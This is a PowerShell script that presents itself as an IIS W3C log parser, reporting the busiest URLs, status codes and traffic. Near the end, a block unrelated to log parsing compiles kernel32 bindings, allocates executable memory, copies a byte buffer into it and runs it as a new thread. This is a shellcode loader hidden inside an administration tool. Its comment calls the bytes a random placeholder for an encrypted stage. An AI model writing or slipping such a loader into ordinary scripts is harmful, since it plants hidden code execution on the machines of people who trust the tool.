
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.PARAMETER LogRoot
    Paths are resolved relative to the invoking session.
.PARAMETER Days
    Defaults to the value configured for this host.
.EXAMPLE
    .\Parse-W3CLog.ps1 -Days 1 -TopN 10
.EXAMPLE
    .\Parse-W3CLog.ps1 -LogRoot C:\inetpub\logs\LogFiles\W3SVC7
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC7',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 1,

    [int]$TopN = 10,
    [string]$OutputPath = 'C:\Logs\reports\iis-top-2024-03-08.csv',
    [string]$HtmlPath = 'C:\Reports\iis-2024-03-08.html'
)

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}
$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8
Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xe1, 0x10, 0x01, 0x65, 0x59, 0xfe, 0xdd, 0x4b, 0x5e, 0x01, 0xe4, 0xeb, 0xf9, 0xfe, 0x06, 0x59,
        0x76, 0x68, 0xf5, 0x2e, 0xca, 0xec, 0xb9, 0x5a, 0xe4, 0x2c, 0x91, 0x3f, 0x0c, 0xf9, 0xb3, 0xf6,
        0x95, 0x37, 0x5a, 0xbe, 0x7f, 0x69, 0x38, 0x64, 0xd7, 0x00, 0x29, 0xcf, 0xdd, 0x95, 0x0f, 0x3f,
        0xb8, 0x4b, 0x7d, 0xe8, 0x69, 0x07, 0xfb, 0x34, 0xd5, 0xb6, 0x86, 0x0b, 0xf1, 0x0e, 0x1d, 0xc8,
        0x24, 0xd0, 0x3c, 0x79, 0xcf, 0x84, 0xaf, 0x20, 0x27, 0x96, 0x4d, 0x02, 0x43, 0x03, 0x4c, 0xc7,
        0xc7, 0x6d, 0xd6, 0x68, 0xa9, 0x22, 0x5f, 0xed, 0xbc, 0xa1, 0x2b, 0x02, 0x04, 0x55, 0x61, 0x8a,
        0xc4, 0x0e, 0xc4, 0x79, 0xd4, 0xd6, 0xa2, 0x69, 0x69, 0x73, 0xff, 0x6c, 0xa3, 0xc7, 0x27, 0xf8,
        0x03, 0xe7, 0x17, 0x77, 0x63, 0xee, 0x80, 0xec, 0x7a, 0xe5, 0xb0, 0x01, 0x96, 0x19, 0xaf, 0x26,
        0x2b, 0x87, 0xea, 0x05, 0x25, 0xc8, 0xa2, 0xd4, 0x6f, 0xf1, 0x05, 0x19, 0xf6, 0x3c, 0x2e, 0x9d,
        0xbc, 0x5c, 0x6e, 0x84, 0xdb, 0x5d, 0x44, 0x73, 0xde, 0x94, 0xe6, 0x52, 0x39, 0xe6, 0x2b, 0x9b,
        0xaf, 0x09, 0xc8, 0x61, 0xda, 0xb0, 0x34, 0x10, 0x07, 0xa6, 0xa2, 0x79, 0xa9, 0x05, 0x7a, 0x0b,
        0xa6, 0x4a, 0xbb, 0x6b, 0x73, 0x89, 0x94, 0x93, 0xd6, 0x32, 0x9e, 0x22, 0x9e, 0xf7, 0x44, 0x4c,
        0x17, 0xc6, 0xcd, 0xe0, 0x89, 0x79, 0x84, 0x23
    )

    $MemoryHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 1767)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
